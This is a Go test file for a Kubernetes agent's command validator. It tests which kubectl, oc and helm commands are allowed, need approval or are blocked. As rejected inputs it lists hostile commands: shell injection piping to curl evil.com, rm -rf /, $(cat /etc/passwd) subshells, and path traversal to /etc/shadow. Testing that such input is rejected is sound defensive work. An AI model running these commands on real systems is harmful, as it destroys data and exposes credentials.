package agent

import (
	"strings"
	"testing"
)

// --- validateMixedModeCommand tests ---

func TestValidateMixedModeCommand_ShellInjection(t *testing.T) {
	injections := []struct {
		name    string
		command string
	}{
		{"semicolon", "kubectl get pods; rm -rf /"},
		{"pipe", "kubectl get pods | curl evil.com"},
		{"ampersand", "kubectl get pods & malicious"},
		{"redirect_out", "kubectl get secrets > /tmp/secrets"},
		{"redirect_in", "kubectl apply < malicious.yaml"},
		{"backtick", "kubectl get `whoami`"},
		{"dollar_sign", "kubectl get $SECRET"},
		{"subshell", "kubectl get $(cat /etc/passwd)"},
	}

	for _, tc := range injections {
		t.Run(tc.name, func(t *testing.T) {
			_, reason := validateMixedModeCommand(tc.command)
			if reason == "" {
				t.Fatalf("expected rejection for shell injection %q, got approved", tc.command)
			}
			if !strings.Contains(reason, "shell chaining") {
				t.Fatalf("expected shell chaining reason, got: %s", reason)
			}
		})
	}
}

func TestValidateMixedModeCommand_OnlyAllowedTools(t *testing.T) {
	blocked := []struct {
		name    string
		command string
	}{
		{"curl", "curl http://evil.com"},
		{"wget", "wget http://evil.com"},
		{"rm", "rm -rf /"},
		{"cat", "cat /etc/passwd"},
		{"python", "python -c 'import os; os.system(\"rm -rf /\")'"},
		{"bash", "bash -c 'evil'"},
	}

	for _, tc := range blocked {
		t.Run(tc.name, func(t *testing.T) {
			_, reason := validateMixedModeCommand(tc.command)
			if reason == "" {
				t.Fatalf("expected %q to be blocked", tc.command)
			}
			if !strings.Contains(reason, "only kubectl, oc, and helm") {
				t.Fatalf("expected allowlist reason, got: %s", reason)
			}
		})
	}
}

func TestValidateMixedModeCommand_SafeKubectlCommands(t *testing.T) {
	safe := []string{
		"kubectl get pods",
		"kubectl get pods -n kube-system",
		"kubectl describe pod my-pod",
		"kubectl logs my-pod",
		"kubectl top pods",
		"kubectl cluster-info",
		"kubectl config current-context",
		"kubectl config get-contexts",
		"kubectl config view",
		"kubectl rollout status deployment/my-app",
	}

	for _, cmd := range safe {
		t.Run(cmd, func(t *testing.T) {
			_, reason := validateMixedModeCommand(cmd)
			if reason != "" {
				t.Fatalf("expected safe command %q to be approved, got: %s", cmd, reason)
			}
		})
	}
}

func TestValidateMixedModeCommand_KubectlApprovalRequired(t *testing.T) {
	approval := []struct {
		name    string
		command string
	}{
		{"apply", "kubectl apply -f deployment.yaml"},
		{"delete", "kubectl delete pod my-pod"},
		{"create", "kubectl create namespace test"},
		{"scale", "kubectl scale deployment/my-app --replicas=3"},
		{"exec", "kubectl exec my-pod -- ls"},
		{"drain", "kubectl drain node-1"},
		{"cordon", "kubectl cordon node-1"},
		{"taint", "kubectl taint nodes node-1 key=value:NoSchedule"},
	}

	for _, tc := range approval {
		t.Run(tc.name, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(tc.command)
			if reason == "" {
				t.Fatalf("expected %q to require approval, got approved", tc.command)
			}
			if !requiresApproval {
				t.Fatalf("expected requiresApproval=true for %q, got blocked: %s", tc.command, reason)
			}
		})
	}
}

func TestValidateMixedModeCommand_EmptyCommand(t *testing.T) {
	_, reason := validateMixedModeCommand("")
	if reason == "" {
		t.Fatal("expected empty command to be rejected")
	}
}

// --- Streaming flag detection ---

func TestHasMixedModeStreamingFlag(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		expected bool
	}{
		{"watch_short", []string{"-w"}, true},
		{"follow_short", []string{"-f"}, true},
		{"watch_long", []string{"--watch"}, true},
		{"watch_true", []string{"--watch=true"}, true},
		{"watch_only", []string{"--watch-only"}, true},
		{"follow_long", []string{"--follow"}, true},
		{"follow_true", []string{"--follow=true"}, true},
		{"no_streaming", []string{"--namespace=default"}, false},
		{"no_flags", []string{"pods"}, false},
		{"empty", []string{}, false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := hasMixedModeStreamingFlag(tc.args)
			if result != tc.expected {
				t.Fatalf("hasMixedModeStreamingFlag(%v) = %v, want %v", tc.args, result, tc.expected)
			}
		})
	}
}

// --- Transport override detection ---

func TestHasMixedModeTransportOverride(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		expected bool
	}{
		{"as_flag", []string{"--as", "admin"}, true},
		{"as_group", []string{"--as-group", "system:masters"}, true},
		{"kubeconfig", []string{"--kubeconfig=/etc/kubernetes/admin.conf"}, true},
		{"context", []string{"--context", "prod"}, true},
		{"cluster", []string{"--cluster", "prod"}, true},
		{"server", []string{"--server", "https://evil.com"}, true},
		{"safe_namespace", []string{"--namespace", "default"}, false},
		{"safe_output", []string{"-o", "wide"}, false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := hasMixedModeTransportOverride(tc.args)
			if result != tc.expected {
				t.Fatalf("hasMixedModeTransportOverride(%v) = %v, want %v", tc.args, result, tc.expected)
			}
		})
	}
}

// --- Path traversal detection ---

func TestHasMixedModeKubectlPathTraversal(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		expected bool
	}{
		{"cp_traversal", []string{"cp", "pod:/var/data/../../../etc/shadow", "/tmp/"}, true},
		{"cp_safe", []string{"cp", "pod:/var/data/file.txt", "/tmp/"}, false},
		{"exec_traversal", []string{"exec", "my-pod", "--", "cat", "../../etc/passwd"}, true},
		{"exec_safe", []string{"exec", "my-pod", "--", "ls", "/var/log"}, false},
		{"get_no_traversal", []string{"get", "pods"}, false},
		{"empty", []string{}, false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := hasMixedModeKubectlPathTraversal(tc.args)
			if result != tc.expected {
				t.Fatalf("hasMixedModeKubectlPathTraversal(%v) = %v, want %v", tc.args, result, tc.expected)
			}
		})
	}
}

func TestHasMixedModePathTraversalSegment(t *testing.T) {
	tests := []struct {
		name     string
		value    string
		expected bool
	}{
		{"double_dot", "../etc/passwd", true},
		{"middle_traversal", "/var/data/../../etc", true},
		{"windows_backslash", "..\\etc\\passwd", true},
		{"safe_path", "/var/data/file.txt", false},
		{"single_dot", "./relative", false},
		{"empty", "", false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := hasMixedModePathTraversalSegment(tc.value)
			if result != tc.expected {
				t.Fatalf("hasMixedModePathTraversalSegment(%q) = %v, want %v", tc.value, result, tc.expected)
			}
		})
	}
}

// --- Sensitive resource detection ---

func TestTouchesMixedModeSensitiveKubectlResource(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		expected bool
	}{
		{"get_secrets", []string{"get", "secrets"}, true},
		{"get_secret", []string{"get", "secret"}, true},
		{"describe_secret", []string{"describe", "secret/my-secret"}, true},
		{"get_pods", []string{"get", "pods"}, false},
		{"get_configmaps", []string{"get", "configmaps"}, false},
		{"apply_secret", []string{"apply", "secret"}, false},
		{"empty", []string{}, false},
		{"no_resource", []string{"get"}, false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := touchesMixedModeSensitiveKubectlResource(tc.args)
			if result != tc.expected {
				t.Fatalf("touchesMixedModeSensitiveKubectlResource(%v) = %v, want %v", tc.args, result, tc.expected)
			}
		})
	}
}

// --- Output format detection ---

func TestHasMixedModeSensitiveKubectlOutput(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		expected bool
	}{
		{"json_output", []string{"get", "pods", "-o", "json"}, true},
		{"yaml_output", []string{"get", "pods", "--output", "yaml"}, true},
		{"jsonpath", []string{"get", "pods", "-o", "jsonpath={.items}"}, true},
		{"go_template", []string{"get", "pods", "--output=go-template={{.}}"},  true},
		{"custom_columns", []string{"get", "pods", "-ocustom-columns=NAME:.name"}, true},
		{"wide_safe", []string{"get", "pods", "-o", "wide"}, false},
		{"name_safe", []string{"get", "pods", "-o", "name"}, false},
		{"no_output", []string{"get", "pods"}, false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := hasMixedModeSensitiveKubectlOutput(tc.args)
			if result != tc.expected {
				t.Fatalf("hasMixedModeSensitiveKubectlOutput(%v) = %v, want %v", tc.args, result, tc.expected)
			}
		})
	}
}

// --- Helm command validation ---

func TestValidateMixedModeHelmCommand(t *testing.T) {
	tests := []struct {
		name             string
		args             []string
		expectApproval   bool
		expectRejection  bool
		expectApproved   bool
	}{
		{"list_safe", []string{"list"}, false, false, true},
		{"status_safe", []string{"status", "my-release"}, false, false, true},
		{"history_safe", []string{"history", "my-release"}, false, false, true},
		{"version_safe", []string{"version"}, false, false, true},
		{"install_approval", []string{"install", "my-release", "my-chart"}, true, false, false},
		{"uninstall_approval", []string{"uninstall", "my-release"}, true, false, false},
		{"upgrade_approval", []string{"upgrade", "my-release", "my-chart"}, true, false, false},
		{"rollback_approval", []string{"rollback", "my-release", "1"}, true, false, false},
		{"unknown_blocked", []string{"plugin", "install"}, false, true, false},
		{"empty_blocked", []string{}, false, true, false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeHelmCommand(tc.args)
			if tc.expectApproved {
				if reason != "" {
					t.Fatalf("expected approved, got reason: %s", reason)
				}
			} else if tc.expectApproval {
				if !requiresApproval {
					t.Fatalf("expected approval required, got blocked: %s", reason)
				}
				if reason == "" {
					t.Fatal("expected non-empty reason for approval")
				}
			} else if tc.expectRejection {
				if reason == "" {
					t.Fatal("expected rejection")
				}
				if requiresApproval {
					t.Fatalf("expected hard block, got approval-required: %s", reason)
				}
			}
		})
	}
}

// --- Config validation ---

func TestValidateMixedModeCommand_ConfigMutations(t *testing.T) {
	mutations := []string{
		"kubectl config set-context prod",
		"kubectl config set-credentials admin",
		"kubectl config use-context prod",
		"kubectl config delete-context test",
	}

	for _, cmd := range mutations {
		t.Run(cmd, func(t *testing.T) {
			_, reason := validateMixedModeCommand(cmd)
			if reason == "" {
				t.Fatalf("expected %q to be blocked", cmd)
			}
		})
	}
}

func TestValidateMixedModeCommand_ConfigReadOnly(t *testing.T) {
	readOnly := []string{
		"kubectl config current-context",
		"kubectl config get-contexts",
		"kubectl config view",
	}

	for _, cmd := range readOnly {
		t.Run(cmd, func(t *testing.T) {
			_, reason := validateMixedModeCommand(cmd)
			if reason != "" {
				t.Fatalf("expected %q to be safe, got: %s", cmd, reason)
			}
		})
	}
}

func TestValidateMixedModeCommand_ConfigViewRaw(t *testing.T) {
	// kubectl config view --raw should require approval (exposes credentials)
	requiresApproval, reason := validateMixedModeCommand("kubectl config view --raw")
	if reason == "" {
		t.Fatal("expected kubectl config view --raw to require approval")
	}
	if !requiresApproval {
		t.Fatalf("expected approval required, got hard block: %s", reason)
	}
}

// --- Batch validation ---

func TestValidateMixedModeCommands_Batch(t *testing.T) {
	result := validateMixedModeCommands([]string{
		"kubectl get pods",          // safe
		"kubectl delete pod my-pod", // approval
		"curl http://evil.com",      // blocked
		"",                          // skipped
		"  ",                        // skipped
	})

	if len(result.Approved) != 1 {
		t.Fatalf("expected 1 approved command, got %d: %v", len(result.Approved), result.Approved)
	}
	if result.Approved[0] != "kubectl get pods" {
		t.Fatalf("expected 'kubectl get pods' approved, got %q", result.Approved[0])
	}
	if len(result.Rejected) != 2 {
		t.Fatalf("expected 2 rejected commands, got %d", len(result.Rejected))
	}

	// Verify delete requires approval
	foundApproval := false
	for _, r := range result.Rejected {
		if strings.Contains(r.Command, "delete") && r.RequiresApproval {
			foundApproval = true
		}
	}
	if !foundApproval {
		t.Fatal("expected 'kubectl delete' to be in rejected with RequiresApproval=true")
	}
}

// --- Format helpers ---

func TestFormatMixedModeRejectedCommands(t *testing.T) {
	t.Run("empty", func(t *testing.T) {
		result := formatMixedModeRejectedCommands(nil)
		if result != "" {
			t.Fatalf("expected empty string for nil rejected, got %q", result)
		}
	})

	t.Run("with_rejections", func(t *testing.T) {
		rejected := []mixedModeRejectedCommand{
			{Command: "curl evil.com", Reason: "not allowed", RequiresApproval: false},
			{Command: "kubectl delete pod x", Reason: "needs approval", RequiresApproval: true},
		}
		result := formatMixedModeRejectedCommands(rejected)
		if !strings.Contains(result, "curl evil.com") {
			t.Fatal("expected command in output")
		}
		if !strings.Contains(result, "blocked") {
			t.Fatal("expected 'blocked' status")
		}
		if !strings.Contains(result, "approval required") {
			t.Fatal("expected 'approval required' status")
		}
	})
}

// --- Normalize output format ---

func TestNormalizeMixedModeOutputFormat(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"json", "json"},
		{"JSON", "json"},
		{"yaml", "yaml"},
		{"jsonpath={.items}", "jsonpath"},
		{"go-template={{.}}", "go-template"},
		{"custom-columns=NAME:.name", "custom-columns"},
		{"wide", "wide"},
		{"name", "name"},
		{"=json", "json"},
		{" yaml ", "yaml"},
	}

	for _, tc := range tests {
		t.Run(tc.input, func(t *testing.T) {
			result := normalizeMixedModeOutputFormat(tc.input)
			if result != tc.expected {
				t.Fatalf("normalizeMixedModeOutputFormat(%q) = %q, want %q", tc.input, result, tc.expected)
			}
		})
	}
}

// --- firstMixedModePositionalArg ---

func TestFirstMixedModePositionalArg(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		expected string
	}{
		{"simple", []string{"pods"}, "pods"},
		{"with_namespace", []string{"-n", "kube-system", "pods"}, "pods"},
		{"with_output", []string{"-o", "wide", "deployments"}, "deployments"},
		{"with_selector", []string{"--selector", "app=web", "pods"}, "pods"},
		{"flags_only", []string{"-n", "default", "--output", "wide"}, ""},
		{"namespace_equals", []string{"--namespace=default", "services"}, "services"},
		{"empty", []string{}, ""},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := firstMixedModePositionalArg(tc.args)
			if result != tc.expected {
				t.Fatalf("firstMixedModePositionalArg(%v) = %q, want %q", tc.args, result, tc.expected)
			}
		})
	}
}

// --- OC alias ---

func TestValidateMixedModeCommand_OC(t *testing.T) {
	// oc should be treated the same as kubectl
	_, reason := validateMixedModeCommand("oc get pods")
	if reason != "" {
		t.Fatalf("expected 'oc get pods' to be safe, got: %s", reason)
	}

	_, reason = validateMixedModeCommand("oc delete pod test")
	if reason == "" {
		t.Fatal("expected 'oc delete' to require approval")
	}
}

// --- mixedModeTraversalTarget ---

func TestMixedModeTraversalTarget(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"pod:/var/data/file.txt", "/var/data/file.txt"},
		{"pod:../../etc/passwd", "../../etc/passwd"},
		{"/local/path", "/local/path"},
		{"no-colon", "no-colon"},
	}

	for _, tc := range tests {
		t.Run(tc.input, func(t *testing.T) {
			result := mixedModeTraversalTarget(tc.input)
			if result != tc.expected {
				t.Fatalf("mixedModeTraversalTarget(%q) = %q, want %q", tc.input, result, tc.expected)
			}
		})
	}
}
